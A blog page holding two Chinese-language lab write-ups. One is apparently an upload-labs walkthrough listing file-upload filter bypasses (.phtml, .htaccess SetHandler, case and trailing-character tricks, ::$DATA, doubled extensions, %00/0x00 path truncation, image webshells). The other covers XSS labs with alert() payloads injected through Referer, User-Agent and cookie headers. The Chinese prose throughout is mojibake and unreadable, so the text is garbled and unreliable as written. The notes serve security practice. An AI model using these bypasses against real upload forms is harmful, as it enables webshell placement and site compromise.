<p>è¦æ±‚ä¸Šä¼ è„šæœ¬æ–‡ä»¶ï¼Œä½†æ˜¯phpä¸å…è®¸ä¸Šä¼ </p>
<p>æ”¹ç”¨.phtmlæ‹“å±•åï¼ŒæˆåŠŸ</p>
<p><strong>ç¬¬å››å…³</strong></p>
<p>è¿™æ¬¡è„šæœ¬åç¼€åŸºæœ¬å…¨éƒ¨è¿‡æ»¤äº†</p>
<p>ä½¿ç”¨htaccessæ–‡ä»¶</p>
<p>å…¶ä¸ºapacheæœåŠ¡å™¨çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶</p>
<p>æ¯”å¦‚ï¼šSetHandler application&#x2F;x-httpd-php</p>
<p>è®¾ç½®å½“å‰æ–‡ä»¶éƒ½ä½¿ç”¨phpè§£æï¼Œé‚£ä¹ˆæ— è®ºä¸Šä¼ ä»»ä½•æ–‡ä»¶ï¼Œåªè¦ä»£ç ç¬¦åˆphpè§„èŒƒï¼Œå°±ä¼šè¢«å½“ä½œphpæ‰§è¡Œ</p>
<p>é¦–å…ˆè¦é…ç½®apache</p>
<p>å†™å…¥ä»£ç <br>SetHandler application&#x2F;x-httpd-php</p>
<p>ä¸Šä¼ .htaccessæ–‡ä»¶</p>
<p>ä¹‹åå°†phpæ–‡ä»¶åç¼€åæ”¹æˆèƒ½ä¸Šä¼ çš„å°±å¯ä»¥äº†</p>
<p>ä½†æ˜¯è¿™å…³å®é™…æ“ä½œæ—¶å¤±è´¥äº†ï¼Œåº”è¯¥æ˜¯é…ç½®æ–‡ä»¶å‡ºäº†é—®é¢˜</p>
<p><strong>ç¬¬äº”å…³</strong></p>
<p>å¤§å°å†™æ¼æ´ï¼Œphp-&gt;Php</p>
<p><strong>ç¬¬å…­å…³</strong></p>
<p>å†åç¼€ååé¢åŠ ä¸€ä¸ªç©ºæ ¼</p>
<p>ä½†æ˜¯windowså­˜å‚¨æ—¶ä¼šå»æ‰ç©ºæ ¼ï¼Œæ‰€ä»¥éœ€è¦æŠ“åŒ…</p>
<p>åœ¨æŠ“çš„åŒ…å†…æ·»åŠ </p>
<p><strong>ç¬¬ä¸ƒå…³</strong></p>
<p>å†åç¼€ååé¢åŠ ä¸€ä¸ª.</p>
<p>ä½†æ˜¯windowså­˜å‚¨æ—¶ä¼šå»æ‰.ï¼Œæ‰€ä»¥éœ€è¦æŠ“åŒ…</p>
<p>åœ¨æŠ“çš„åŒ…å†…æ·»åŠ </p>
<p><strong>ç¬¬å…«å…³</strong></p>
<p>åœ¨æ–‡ä»¶ååé¢åŠ ä¸Š::$DATA</p>
<p>å’Œä¸Šä¸€å…³ä¸€æ ·</p>
<p><strong>ç¬¬ä¹å…³</strong></p>
<p>åˆ é™¤æœ«å°¾çš„.äº†ï¼Œä½†æ˜¯åªåˆ é™¤ä¸€ä¸ª</p>
<p>åŒå†™.</p>
<p>å…¶ä»–ä¸ä¸Šä¸€å…³ä¸€æ ·</p>
<p><strong>ç¬¬åå…³</strong></p>
<p>å› ä¸ºé»‘åå•çš„åç¼€åä¼šæ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥å­˜åœ¨åŒå†™æ¼æ´æ”¹æˆphphpp</p>
<p><strong>ç¬¬åä¸€å…³</strong></p>
<p>00æˆªæ–­</p>
<p>0x00ä¸º16è¿›åˆ¶çš„00ï¼Œè§£æåä¸ºç©ºï¼›%00urlè§£ç ä¹‹åä¸ºç©º</p>
<p>å½“ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é—´å‡ºç°ç©ºæ ¼ï¼Œåé¢çš„é‚£éƒ¨åˆ†ä¼šè¢«å¿½ç•¥</p>
<p>_GETä¼ é€’æ—¶ä¼šè‡ªåŠ¨ç¼–ç ï¼Œæ‰€ä»¥ç”¨%00</p>
<p>_POSTä¼ é€’æ—¶ä¸ä¼šè‡ªåŠ¨ç¼–ç ï¼Œæ‰€ä»¥ç”¨0x00</p>
<p>å…ˆçœ‹æºä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;]</span><br><span class="line">[&#x27;name&#x27;],&quot;.&quot;)+1);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆç”Ÿæˆçš„<code>$img_path</code>å˜é‡å°†åŒ…å«å®Œæ•´çš„æ–‡ä»¶è·¯å¾„å’Œæ–‡ä»¶åï¼Œä¾›åç»­çš„æ–‡ä»¶ä¿å­˜æ“ä½œä½¿ç”¨ã€‚</p>
<p>burpæŠ“åŒ…</p>
<p>æ”¹save_pathä¸º..&#x2F;upload&#x2F;123.php%00</p>
<p>è¿™æ ·æ–‡ä»¶è·¯å¾„å’Œæ–‡ä»¶åè¿åœ¨ä¸€èµ·ï¼Œ123.jpgè¢«å¿½ç•¥</p>
<p><strong>ç¬¬åäºŒå…³</strong></p>
<p>å’Œç¬¬11å…³ç›¸ä¼¼ï¼Œä¸è¿‡æ˜¯_POST</p>
<p>ä½¿ç”¨0x00å³å¯</p>
<p>å› ä¸ºPOSTä¸ä¼šè§£ç ï¼Œ%00ç¼–ç ä¸€ä¸‹æˆ%25%30%30ä¹Ÿè¡Œ</p>
<p><strong>ç¬¬åä¸‰å…³</strong></p>
<p>å›¾ç‰‡é©¬ï¼Œåœ¨cmdé‡Œé¢ä½¿ç”¨copyçš„æ–¹æ³•å°†ä»£ç å’Œå›¾ç‰‡ç»“åˆåœ¨ä¸€èµ·ç”Ÿæˆæ–°æ–‡ä»¶</p>
<p>ä¸Šä¼ æ–°æ–‡ä»¶å³å¯</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/15/upload/" data-id="clto5uldd000dtwb5hq0wh3sd" data-title="upload" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-xss-11-13" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/13/xss-11-13/" class="article-date">
  <time class="dt-published" datetime="2024-02-13T15:23:10.000Z" itemprop="datePublished">2024-02-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/13/xss-11-13/">xss_11~13</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;a&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onblur=&#x27;alert(/1/)&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(&#x27;a&#x27;)&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>ç¬¬åä¸€å…³</strong></p>
<p>å’Œç¬¬åå…³ä¸€æ ·ï¼Œå…ˆæ‰¾å“ªä¸ªèƒ½æ¥æ”¶getï¼Œå‘ç°æ˜¯t_sortï¼Œä½†æ˜¯æ³¨å…¥ä¹‹åæ²¡æœ‰æ˜¾ç¤ºæŒ‰é’®ï¼ŒåŸå› æ˜¯â€˜ â€œè¢«è¿‡æ»¤</p>
<p>çœ‹æºä»£ç å‘ç°t_reä¼šæ¥æ”¶è®°å½•çš„ç¬¬åå…³çš„refrerï¼Œå³ä¸ºä¸Šä¸€ä¸ªç•Œé¢çš„urlåœ°å€</p>
<p>ä½¿ç”¨burpæŠ“åŒ…ï¼Œä¿®æ”¹refrerå³å¯</p>
<p><strong>ç¬¬åäºŒå…³</strong></p>
<p>å’Œä¸Šä¸€å…³ç±»ä¼¼ï¼Œè¿™æ¬¡æ¢æˆuaå¤´äº†</p>
<p><strong>ç¬¬åä¸‰å…³</strong></p>
<p>å’Œä¸Šä¸€å…³ç±»ä¼¼ï¼Œè¿™æ¬¡æ¢æˆcookieäº†</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/13/xss-11-13/" data-id="clto5uldd000etwb581521a5f" data-title="xss_11~13" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/html-css-js%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" rel="tag">html, css, jsåŸºç¡€å­¦ä¹ </a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/html-css-js%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">html, css, jsåŸºç¡€å­¦ä¹ </a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/03/12/XXE/">XXE</a>
          </li>
        
          <li>
            <a href="/2024/03/07/ssrf/">ssrf</a>
          </li>
        
          <li>
            <a href="/2024/03/05/%E5%8E%9F%E7%94%9F%E7%B1%BB/">åŸç”Ÿç±»</a>
          </li>
        
          <li>
            <a href="/2024/03/04/phototype-1/">phototype_1</a>
          </li>
        
          <li>
            <a href="/2024/03/03/phototype/">phototype</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>